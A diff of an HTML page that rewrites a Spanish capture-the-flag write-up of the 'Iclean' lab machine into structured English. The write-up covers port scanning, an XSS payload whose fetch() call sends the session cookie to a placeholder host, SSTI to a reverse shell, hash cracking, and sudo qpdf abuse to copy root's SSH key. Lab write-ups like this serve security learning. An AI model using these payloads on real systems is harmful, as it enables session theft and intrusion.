@@ -7,6 +7,149 @@
   <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
 </head>
 <body>
-<div class='page'><h1 class='title'>Iclean</h1><br/><p><ol><li>Realizo un escaneo de puertos <strong>nmap 10.10.11.12 -sS -T4 -A -p- -oN scan.txt</strong></li><li>Encuentro los  servicios ssh(22) y http(80)</li><li>Añado el Domain name a mi lista de<strong> /etc/hosts</strong> </li></ol><img src="images/84-1.png" alt="images/84-1.png" /><ol><li>Uso ffuf para encontrar endpoints interesantes<strong> ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u </strong><strong><a href="http://capiclean.htb/FUZZ">http://capiclean.htb/FUZZ</a></strong><strong> -fc 404</strong> </li></ol><img src="images/84-2.png" alt="images/84-2.png" /><ol><li>A través de <a href="http://capiclean.htb/quote">http://capiclean.htb/quote</a> puede que me deje ejecutar  un XSS.</li><li>Intercepto la respuesta con Burpsuite </li></ol><img src="images/84-3.png" alt="images/84-3.png" /><ol><li>Veo que el parametro service es vulnerable a<strong> XSS</strong> </li></ol><img src="images/84-4.png" alt="images/84-4.png" /><ol><li>Uso este código dentro de service para obtener la cookie <strong>  &lt;img src=x onerror=fetch(&quot;http://&lt;IP&gt;:&lt;PORT&gt;/&quot;+document.cookie);&gt;</strong></li><li>Para que lo pille bien tendré que codificarlo en base64</li><li>Al introducirlo obtengo la cookie <strong>&quot;GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZkpGCg.Uxy5EDul_e-QG6dvNx-kwNyhzBo HTTP/1.1&quot;</strong></li><li>Probablemente tengamos que usar esta cookie para bypassear un login </li></ol><img src="images/84-5.png" alt="images/84-5.png" /><ol><li>Al no encontrar donde añadir la cookie lo hago a través de la extensión cookie editor </li></ol><img src="images/84-6.png" alt="images/84-6.png" /><ol><li>Luego si la añadimos podremos acceder al dashboard como administrador  <a href="http://capiclean.htb/dashboard">http://capiclean.htb/dashboard</a></li><li>Generamos un invoice ID </li></ol><img src="images/84-7.png" alt="images/84-7.png" /><ol><li>Y en generar el QR introducimos ese ID </li></ol><img src="images/84-8.png" alt="images/84-8.png" /><ol><li>Después de crearlo me da un enlace  </li></ol><img src="images/84-9.png" alt="images/84-9.png" /><ol><li>Pongo el link del QR y me da una factura </li></ol><img src="images/84-10.png" alt="images/84-10.png" /><ol><li>Intercepto la solicitud <strong>POST</strong> al darle al botón submit </li></ol><img src="images/84-11.png" alt="images/84-11.png" /><ol><li>Creo que /QRGenerator es vulnerable a SSTI por que usa Flask, al ser un marco de trabajo que utiliza Jinja como motor de plantillas, es vulnerable a este tipo de ataques si no se maneja correctamente </li></ol><img src="images/84-12.png" alt="images/84-12.png" /><ol><li></li></ol><img src="images/84-13.png" alt="images/84-13.png" /><ol><li>Me devuelve el código 49 por lo que si que es vulnerable a SSTI.</li><li>Uso este SSTI <a href="https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/?source=post_page-----cfc46f351353--------------------------------">https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/?source=post_page-----cfc46f351353--------------------------------</a></li><li>La parte del payload para obtener el reverse la codifico en<strong> url encoded</strong> y obtengo el reverse en mi netcat como <strong>www-data</strong> </li></ol><img src="images/84-14.png" alt="images/84-14.png" /><ol><li>Después de hacer un poco de footprint encuentro que <strong>app.py</strong> leekea las credenciales de la db </li></ol><img src="images/84-15.png" alt="images/84-15.png" /><ol><li>Me conectro a mysql  <strong>mysql -u &lt;user&gt; -p &lt;password&gt;</strong></li><li>Encuentro los hashes de consuela y de Administrator. El hash que me interesa el el de consuela ya que en home es el unico usuario que encontramos.  Probablemente sea el usuario que usaremos para escalar privilegios.</li><li>El hash lo crackeo en crackstation y accedo a este usuario a través de ssh </li></ol><img src="images/84-16.png" alt="images/84-16.png" /><ol><li>Ejecuto <strong>sudo -l</strong> y veo que puedo ejecutar el comando <strong>/usr/bin/qpdf</strong> como root </li><li>Con el comando puedo copiar el archivo id_rsa de root en mi carpeta tmp </li></ol><img src="images/84-17.png" alt="images/84-17.png" /><ol><li></li></ol><img src="images/84-18.png" alt="images/84-18.png" /><ol><li>Accedo a través de ssh con el usuario root. Si no me deja coger el id_rsa hay que cambiarle los privilegios al archivo. </li></ol><img src="images/84-19.png" alt="images/84-19.png" /></p></div>
+<div class="page">
+<h1 class="title">Iclean</h1>
+
+<section>
+<h2>Reconnaissance</h2>
+<p>
+I began the engagement by performing a full TCP port scan to identify exposed services on the target host.
+</p>
+<pre><code>nmap 10.10.11.12 -sS -T4 -A -p- -oN scan.txt</code></pre>
+<p>
+The scan revealed two services running on the system: SSH on port 22 and an HTTP service on port 80. Based on the HTTP response headers and behavior, I identified a domain name associated with the application and added it to my local <code>/etc/hosts</code> file to ensure proper name resolution.
+</p>
+<img src="images/84-1.png" alt="images/84-1.png" />
+</section>
+
+<section>
+<h2>Enumeration / Analysis</h2>
+<p>
+With the web application identified as the main attack surface, I used ffuf to enumerate potential endpoints and directories that could expose additional functionality.
+</p>
+<pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://capiclean.htb/FUZZ -fc 404</code></pre>
+<img src="images/84-2.png" alt="images/84-2.png" />
+
+<p>
+One of the discovered endpoints was <code>/quote</code>, which appeared to reflect user input. This behavior suggested a potential cross-site scripting vulnerability, so I intercepted the request and response using Burp Suite for further inspection.
+</p>
+<img src="images/84-3.png" alt="images/84-3.png" />
+
+<p>
+By analyzing the intercepted traffic, I confirmed that the <code>service</code> parameter was vulnerable to reflected XSS.
+</p>
+<img src="images/84-4.png" alt="images/84-4.png" />
+
+<p>
+To exploit this, I injected the following payload into the vulnerable parameter in order to exfiltrate the victim’s session cookie:
+</p>
+<pre><code>&lt;img src=x onerror=fetch("http://&lt;IP&gt;:&lt;PORT&gt;/"+document.cookie);&gt;</code></pre>
+<p>
+To ensure correct processing by the application, the payload was encoded in Base64. After submitting the request, I received a callback containing the session cookie:
+</p>
+<pre><code>GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZkpGCg.Uxy5EDul_e-QG6dvNx-kwNyhzBo HTTP/1.1</code></pre>
+<p>
+This cookie appeared to belong to a privileged user and could potentially be used to bypass authentication.
+</p>
+<img src="images/84-5.png" alt="images/84-5.png" />
+
+<p>
+Since there was no direct way to supply the cookie through the application interface, I injected it manually using a browser cookie editor extension.
+</p>
+<img src="images/84-6.png" alt="images/84-6.png" />
+
+<p>
+Once the cookie was set, I was able to access the administrative dashboard successfully.
+</p>
+<p>
+<a href="http://capiclean.htb/dashboard">http://capiclean.htb/dashboard</a>
+</p>
+<img src="images/84-7.png" alt="images/84-7.png" />
+
+<p>
+From the dashboard, I generated an invoice ID and then used that ID in the QR code generation feature.
+</p>
+<img src="images/84-8.png" alt="images/84-8.png" />
+
+<p>
+After generating the QR code, the application provided a URL associated with it.
+</p>
+<img src="images/84-9.png" alt="images/84-9.png" />
+
+<p>
+By visiting the QR URL, I was presented with the corresponding invoice.
+</p>
+<img src="images/84-10.png" alt="images/84-10.png" />
+
+<p>
+I intercepted the POST request generated when submitting the QR generation form to analyze how the data was processed server-side.
+</p>
+<img src="images/84-11.png" alt="images/84-11.png" />
+
+<p>
+The endpoint <code>/QRGenerator</code> appeared to be implemented using Flask. Since Flask uses Jinja2 as its templating engine, I suspected a Server-Side Template Injection vulnerability if user input was not properly sanitized.
+</p>
+<img src="images/84-12.png" alt="images/84-12.png" />
+<img src="images/84-13.png" alt="images/84-13.png" />
+
+<p>
+Testing with a basic arithmetic payload confirmed the vulnerability, as the server evaluated the expression and returned the expected result.
+</p>
+<img src="images/84-14.png" alt="images/84-14.png" />
+</section>
+
+<section>
+<h2>Exploitation</h2>
+<p>
+With SSTI confirmed, I leveraged a known Jinja2 exploitation technique to achieve remote code execution. The payload was adapted from the following reference:
+</p>
+<p>
+<a href="https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/?source=post_page-----cfc46f351353--------------------------------">
+https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
+</a>
+</p>
+<p>
+The reverse shell portion of the payload was URL-encoded to ensure proper delivery. Upon submission, I received a reverse shell as the <code>www-data</code> user.
+</p>
+
+<p>
+During post-exploitation enumeration, I discovered that the <code>app.py</code> file leaked database credentials in clear text.
+</p>
+<img src="images/84-15.png" alt="images/84-15.png" />
+
+<p>
+Using these credentials, I connected to the MySQL database and enumerated the stored user hashes.
+</p>
+<pre><code>mysql -u &lt;user&gt; -p &lt;password&gt;</code></pre>
+<p>
+Among the retrieved hashes were entries for the users <code>consuela</code> and <code>Administrator</code>. Since <code>consuela</code> was the only non-system user with a home directory, I focused on that account. I cracked the hash using CrackStation and authenticated successfully via SSH.
+</p>
+<img src="images/84-16.png" alt="images/84-16.png" />
+</section>
+
+<section>
+<h2>Privilege Escalation</h2>
+<p>
+After logging in as Consuela, I checked for sudo permissions to identify potential privilege escalation vectors.
+</p>
+<pre><code>sudo -l</code></pre>
+<p>
+The output showed that I could execute <code>/usr/bin/qpdf</code> as root without providing a password.
+</p>
+<img src="images/84-17.png" alt="images/84-17.png" />
+
+<p>
+By abusing this permission, I was able to copy the root user’s private SSH key into a writable directory such as <code>/tmp</code>.
+</p>
+<img src="images/84-18.png" alt="images/84-18.png" />
+
+<p>
+Using the extracted key, I authenticated as the root user via SSH. In cases where access to the key was restricted, adjusting the file permissions was sufficient to complete the process.
+</p>
+<img src="images/84-19.png" alt="images/84-19.png" />
+</section>
+
+</div>
 </body>
+
 </html>
